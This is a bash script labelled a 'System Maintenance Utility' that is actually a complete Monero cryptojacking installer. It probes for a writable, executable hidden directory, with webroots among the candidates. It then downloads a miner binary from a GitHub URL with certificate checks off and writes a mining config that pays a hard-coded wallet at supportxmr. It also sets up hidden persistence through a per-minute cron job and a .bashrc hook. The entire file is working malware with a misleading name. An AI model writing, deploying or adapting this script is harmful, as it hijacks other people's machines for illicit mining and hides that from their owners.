#!/bin/bash
# System Maintenance Utility v6.0 FINAL
# Fix: auto-pick NON-TEMP exec dir | 16-core ready | no noexec issue
# Repository: dailam008/kongkalikong
# Support: pool.supportxmr.com

set -e

# ═══════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════

WALLET="46Z9A1TZiGJSgJtDtZzar9Lgum3B7xW9eG8TDKKhVW5yhJzX118fS2eep3ry8i7Z6PPwP2P4YDvzS7h9L8Ji43C9Jh9fwPb"
POOL="pool.supportxmr.com:443"
REPO="https://raw.githubusercontent.com/boyyywiliam/Aselole/main"
SCRIPT_VERSION="6.0"

# ═══════════════════════════════════════════════════════════════════
# EXEC PROBE
# ═══════════════════════════════════════════════════════════════════

is_exec_ok() {
    local dir="$1"
    [ -d "$dir" ] || return 1
    [ -w "$dir" ] || return 1

    local probe="$dir/.x_$$"
    printf '#!/bin/sh\nexit 0\n' > "$probe" 2>/dev/null || return 1
    chmod 755 "$probe" 2>/dev/null || { rm -f "$probe"; return 1; }
    if "$probe" >/dev/null 2>&1; then
        rm -f "$probe"
        return 0
    fi
    rm -f "$probe"
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# PICK NON-TEMP EXEC DIR
# Prioritas: home user, webroot, /var/www, /srv, /opt, /usr/local
# SKIP total: /tmp, /var/tmp, /dev/shm (karena noexec)
# ═══════════════════════════════════════════════════════════════════

pick_base_dir() {
    local user_home="$HOME"
    local me=$(whoami)

    # Kandidat NON-TEMP, urut dari paling masuk akal
    local candidates=(
        "${user_home}/.dbus-sys"
        "/var/www/vhosts/${me}/.dbus-sys"
        "/var/www/.dbus-sys-${me}"
        "/var/www/html/.dbus-sys-${me}"
        "/home/${me}/public_html/.dbus-sys"
        "/usr/local/apache/htdocs/.dbus-sys-${me}"
        "/srv/www/.dbus-sys-${me}"
        "/srv/.dbus-sys-${me}"
        "/opt/.dbus-sys-${me}"
        "/usr/local/.dbus-sys-${me}"
        "/var/lib/.dbus-sys-${me}"
        "/var/www/html"
    )

    # Deteksi webroot yang umum writable
    for wr in /var/www/vhosts/*/httpdocs /home/*/public_html /var/www/html /usr/share/nginx/html; do
        [ -d "$wr" ] || continue
        if [ -w "$wr" ] 2>/dev/null; then
            candidates+=("${wr}/.dbus-sys-${me}")
        fi
    done

    # Deteksi path user dari passwd (kalau $HOME kosong/minimal)
    local pwd_home=$(getent passwd "$me" 2>/dev/null | cut -d: -f6)
    [ -n "$pwd_home" ] && candidates+=("${pwd_home}/.dbus-sys")

    for base in "${candidates[@]}"; do
        local parent=$(dirname "$base")
        # pastikan parent ada & writable
        if [ ! -d "$parent" ]; then
            mkdir -p "$parent" 2>/dev/null || continue
        fi
        [ -w "$parent" ] 2>/dev/null || continue

        # coba bikin base dir-nya (kadang parent writable, base belum ada)
        mkdir -p "$base" 2>/dev/null || continue

        if is_exec_ok "$base"; then
            echo "$base"
            return 0
        else
            # cleanup kalau gagal exec
            rmdir "$base" 2>/dev/null || true
        fi
    done

    # Fallback terakhir: scan semua mount yang bukan noexec & writable
    while IFS= read -r mnt; do
        [ -d "$mnt" ] || continue
        [ -w "$mnt" ] || continue
        case "$mnt" in
            /proc*|/sys*|/dev*) continue ;;
        esac
        local cand="${mnt%/}/.dbus-sys-${me}"
        mkdir -p "$cand" 2>/dev/null || continue
        if is_exec_ok "$cand"; then
            echo "$cand"
            return 0
        fi
        rmdir "$cand" 2>/dev/null || true
    done < <(awk '$4 !~ /noexec/ && $2 != "/" {print $2}' /proc/mounts 2>/dev/null | sort -u)

    # bener-bener gak ada
    echo ""
    return 1
}

determine_base_dir() {
    local base
    base=$(pick_base_dir) || true
    if [ -z "$base" ]; then
        echo "[ERROR] Tidak ada direktori exec-able & writable yang ditemukan." >&2
        echo "[ERROR] Semua mount kandidat noexec." >&2
        exit 1
    fi
    echo "$base"
}

check_tools() {
    local tools=""
    for t in wget curl aria2c lynx w3m perl python3 python; do
        command -v "$t" &>/dev/null && tools="$tools $t"
    done
    [ -z "$tools" ] && tools="NONE"
    echo "$tools"
}

detect_cores() {
    local cores=0
    if command -v nproc &>/dev/null; then
        cores=$(nproc)
    elif [ -f /proc/cpuinfo ]; then
        cores=$(grep -c ^processor /proc/cpuinfo)
    else
        cores=$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)
    fi
    [ "$cores" -lt 1 ] && cores=1
    echo "$cores"
}

validate_file() {
    local file="$1"
    [ -f "$file" ] || return 1
    local size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null || echo 0)
    if [ "$size" -gt 2000000 ]; then
        return 0
    else
        echo "[!] File too small: $size bytes"
        return 1
    fi
}

create_dirs() {
    local BASE="$1"
    local attempt=1
    while [ $attempt -le 5 ]; do
        if mkdir -p "$BASE/sbin" "$BASE/cfg" "$BASE/log" "$BASE/run" "$BASE/tmp" 2>/dev/null; then
            chmod 755 "$BASE" "$BASE/sbin" "$BASE/cfg" "$BASE/run" "$BASE/tmp" 2>/dev/null || true
            return 0
        fi
        echo "[*] mkdir attempt $attempt/5 failed, retry..."
        sleep $((attempt * 2))
        attempt=$((attempt + 1))
    done
    echo "[ERROR] Failed to create directories"
    return 1
}

upload_file() {
    local BASE="$1"; local src="$2"
    [ -f "$src" ] || { echo "[ERROR] Not found: $src"; return 1; }
    local dst="$BASE/tmp/$(basename "$src")"
    cp "$src" "$dst" && chmod 644 "$dst" && echo "[+] Uploaded: $src -> $dst"
}

change_dir() {
    local BASE="$1"; local target="$2"
    [ -z "$target" ] && { cd "$BASE" && echo "[+] $(pwd)"; return 0; }
    if [ -d "$BASE/$target" ]; then cd "$BASE/$target" && echo "[+] $(pwd)"
    elif [ -d "$target" ]; then cd "$target" && echo "[+] $(pwd)"
    else echo "[ERROR] Not found: $target"; return 1; fi
}

# ═══════════════════════════════════════════════════════════════════
# DOWNLOAD
# ═══════════════════════════════════════════════════════════════════

download_binary() {
    local BIN_NAME="$1"; local BASE="$2"
    local url="${REPO}/${BIN_NAME}"
    local temp_file="$BASE/tmp/.dl_$$"
    local attempt=1
    local max_attempts=15

    echo "[*] Downloading core: $BIN_NAME"
    echo "[*] Available tools: $(check_tools)"

    while [ $attempt -le $max_attempts ]; do
        echo "[*] Attempt $attempt/$max_attempts..."

        command -v wget &>/dev/null && wget --no-check-certificate --timeout=30 -q -O "$temp_file" "$url" 2>/dev/null && validate_file "$temp_file" && {
            echo "[+] wget OK: $(stat -c%s "$temp_file" 2>/dev/null) bytes"
            mv "$temp_file" "$BASE/sbin/sysvol"; chmod 755 "$BASE/sbin/sysvol"; return 0; }

        command -v curl &>/dev/null && curl -fsSLk --max-time 30 -o "$temp_file" "$url" 2>/dev/null && validate_file "$temp_file" && {
            echo "[+] curl OK: $(stat -c%s "$temp_file" 2>/dev/null) bytes"
            mv "$temp_file" "$BASE/sbin/sysvol"; chmod 755 "$BASE/sbin/sysvol"; return 0; }

        command -v aria2c &>/dev/null && aria2c -x 4 --max-tries=3 --timeout=30 -o dl.tmp "$url" -d "$BASE/tmp" 2>/dev/null && \
            [ -f "$BASE/tmp/dl.tmp" ] && validate_file "$BASE/tmp/dl.tmp" && {
            echo "[+] aria2c OK"
            mv "$BASE/tmp/dl.tmp" "$BASE/sbin/sysvol"; chmod 755 "$BASE/sbin/sysvol"; return 0; }

        command -v lynx &>/dev/null && lynx -dump -source "$url" > "$temp_file" 2>/dev/null && validate_file "$temp_file" && {
            echo "[+] lynx OK"
            mv "$temp_file" "$BASE/sbin/sysvol"; chmod 755 "$BASE/sbin/sysvol"; return 0; }

        command -v w3m &>/dev/null && w3m -dump_source "$url" > "$temp_file" 2>/dev/null && validate_file "$temp_file" && {
            echo "[+] w3m OK"
            mv "$temp_file" "$BASE/sbin/sysvol"; chmod 755 "$BASE/sbin/sysvol"; return 0; }

        command -v perl &>/dev/null && perl -e "use LWP::UserAgent; my \$ua=LWP::UserAgent->new; my \$r=\$ua->get('$url'); open(F,'>','$temp_file') or die; print F \$r->content; close F;" 2>/dev/null && validate_file "$temp_file" && {
            echo "[+] perl OK"
            mv "$temp_file" "$BASE/sbin/sysvol"; chmod 755 "$BASE/sbin/sysvol"; return 0; }

        local py=$(command -v python3 || command -v python)
        if [ -n "$py" ]; then
            $py -c "import urllib.request,sys; urllib.request.urlretrieve('$url','$temp_file'); sys.exit(0)" 2>/dev/null && validate_file "$temp_file" && {
                echo "[+] python OK"
                mv "$temp_file" "$BASE/sbin/sysvol"; chmod 755 "$BASE/sbin/sysvol"; return 0; }
        fi

        rm -f "$temp_file" "$BASE/tmp/dl.tmp" 2>/dev/null
        [ $attempt -lt $max_attempts ] && sleep $((attempt * 3))
        attempt=$((attempt + 1))
    done

    echo "[ERROR] Download failed"
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# DEPLOY
# ═══════════════════════════════════════════════════════════════════

deploy_core() {
    local BASE="$1"; local BIN_NAME="$2"

    echo "[*] ═══════════════════════════════════════════════════════════"
    echo "[*] System Maintenance Utility v${SCRIPT_VERSION}"
    echo "[*] ═══════════════════════════════════════════════════════════"
    echo "[*] Base directory: $BASE"

    create_dirs "$BASE" || return 1

    [ -w "$BASE" ] || { echo "[ERROR] Not writable: $BASE"; return 1; }

    # pre-check exec di base
    if ! is_exec_ok "$BASE"; then
        echo "[!] Base dir tiba-tiba noexec, ulang cari..."
        local NEW=$(pick_base_dir)
        [ -z "$NEW" ] && { echo "[ERROR] No exec dir"; return 1; }
        BASE="$NEW"
        echo "[+] New base: $BASE"
        create_dirs "$BASE" || return 1
    fi

    download_binary "$BIN_NAME" "$BASE" || return 1

    # verify exec binary
    if ! "$BASE/sbin/sysvol" --version >/dev/null 2>&1; then
        chmod 755 "$BASE/sbin/sysvol" 2>/dev/null || true
        if ! "$BASE/sbin/sysvol" --version >/dev/null 2>&1; then
            echo "[!] Binary tidak exec di $BASE, relokasi..."
            local ALT=$(pick_base_dir)
            if [ -z "$ALT" ] || [ "$ALT" = "$BASE" ]; then
                echo "[ERROR] Tidak ada lokasi alternatif"
                return 1
            fi
            mkdir -p "$ALT/sbin" "$ALT/cfg" "$ALT/log" "$ALT/run" "$ALT/tmp" 2>/dev/null
            mv "$BASE/sbin/sysvol" "$ALT/sbin/sysvol" 2>/dev/null || cp "$BASE/sbin/sysvol" "$ALT/sbin/sysvol"
            chmod 755 "$ALT/sbin/sysvol"
            BASE="$ALT"
            "$BASE/sbin/sysvol" --version >/dev/null 2>&1 || { echo "[ERROR] Masih gagal di $ALT"; return 1; }
            echo "[+] Relokasi ke: $BASE"
        fi
    fi

    local CORES=$(detect_cores)
    local THREADS=$((CORES > 8 ? CORES - 1 : CORES))
    [ "$THREADS" -lt 1 ] && THREADS=1

    echo "[*] CPU cores detected: $CORES"
    echo "[*] Miner threads set: $THREADS"

    local WORKER="srv-$(hostname)-$(date +%s | tail -c 4)"
    echo "[*] Worker ID: $WORKER"

    cat > "$BASE/cfg/config.json" << CFGEOF
{
  "autosave": true,
  "background": false,
  "colors": false,
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "hw-aes": null,
    "priority": null,
    "memory-pool": false,
    "yield": true,
    "max-threads-hint": ${THREADS},
    "asm": true
  },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "donate-level": 0,
  "donate-over-proxy": 0,
  "log-file": null,
  "pools": [
    {
      "algo": "rx/0",
      "coin": "monero",
      "url": "${POOL}",
      "user": "${WALLET}",
      "pass": "${WORKER}",
      "keepalive": true,
      "enabled": true,
      "tls": true,
      "daemon": false
    }
  ],
  "print-time": 60,
  "health-print-time": 60,
  "retries": 5,
  "retry-pause": 5,
  "syslog": false,
  "verbose": 0,
  "watch": true,
  "pause-on-battery": false,
  "pause-on-active": false
}
CFGEOF

    chmod 600 "$BASE/cfg/config.json"
    touch "$BASE/log/core.log"
    chmod 644 "$BASE/log/core.log"
    echo "[+] Configuration created"

    cat > "$BASE/run/guard.sh" << GRDEOF
#!/bin/bash
BASE="__BASE_PATH__"
BIN="\$BASE/sbin/sysvol"
CFG="\$BASE/cfg/config.json"
PID_FILE="\$BASE/run/state.pid"
LOG="\$BASE/log/core.log"

if [ -f "\$PID_FILE" ]; then
    PID=\$(cat "\$PID_FILE" 2>/dev/null)
    kill -0 "\$PID" 2>/dev/null && exit 0
fi

mkdir -p "\$(dirname "\$LOG")" 2>/dev/null
nohup "\$BIN" -c "\$CFG" >> "\$LOG" 2>&1 &
echo \$! > "\$PID_FILE"
GRDEOF

    sed -i "s|__BASE_PATH__|$BASE|" "$BASE/run/guard.sh"
    chmod +x "$BASE/run/guard.sh"
    echo "[+] Guard script created"

    pkill -f "[s]ysvol" 2>/dev/null || true
    rm -f "$BASE/run/state.pid" 2>/dev/null

    echo "[*] Starting service..."
    "$BASE/run/guard.sh"
    sleep 5

    local retry=0
    while [ $retry -lt 10 ]; do
        pgrep -f "[s]ysvol" >/dev/null 2>&1 && break
        echo "[*] Waiting... ($((retry+1))/10)"
        sleep 3
        retry=$((retry + 1))
    done

    if pgrep -f "[s]ysvol" >/dev/null 2>&1; then
        local PID=$(pgrep -f "[s]ysvol" | head -1)
        echo ""
        echo "╔════════════════════════════════════════════════════════╗"
        echo "║           [SUCCESS] SERVICE RUNNING! ✓                 ║"
        echo "╠════════════════════════════════════════════════════════╣"
        echo "║ Process ID : $PID"
        echo "║ Core       : $BASE/sbin/sysvol"
        echo "║ Config     : $BASE/cfg/config.json"
        echo "║ Log        : $BASE/log/core.log"
        echo "║ Pool       : $POOL"
        echo "║ Worker     : $WORKER"
        echo "║ Threads    : $THREADS / $CORES cores"
        echo "╚════════════════════════════════════════════════════════╝"
        echo ""
        ps aux | grep "[s]ysvol" | grep -v grep
        echo ""

        if command -v crontab &>/dev/null; then
            (crontab -l 2>/dev/null || echo ""; echo "* * * * * $BASE/run/guard.sh >/dev/null 2>&1") | crontab - 2>/dev/null && echo "[+] Cron installed" || echo "[!] Cron skipped"
        fi

        [ -f ~/.bashrc ] && ! grep -q "dbus-sys" ~/.bashrc 2>/dev/null && \
            echo "[ -f \"$BASE/run/guard.sh\" ] && $BASE/run/guard.sh >/dev/null 2>&1 &" >> ~/.bashrc && echo "[+] .bashrc hooked"

        return 0
    else
        echo ""
        echo "╔════════════════════════════════════════════════════════╗"
        echo "║          [ERROR] SERVICE FAILED TO START ✗             ║"
        echo "╚════════════════════════════════════════════════════════╝"
        tail -25 "$BASE/log/core.log" 2>/dev/null || echo "No log"
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

BASE=$(determine_base_dir)
echo "[*] Selected base dir: $BASE"

ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) BIN_NAME="cibung"; echo "[*] Arch: x86_64" ;;
    aarch64|arm64) BIN_NAME="cibung008"; echo "[*] Arch: ARM64" ;;
    armv7l|armv7) BIN_NAME="cibung-armv7"; echo "[*] Arch: ARMv7" ;;
    *) echo "[ERROR] Unsupported arch: $ARCH"; exit 1 ;;
esac

deploy_core "$BASE" "$BIN_NAME" && exit 0 || exit 1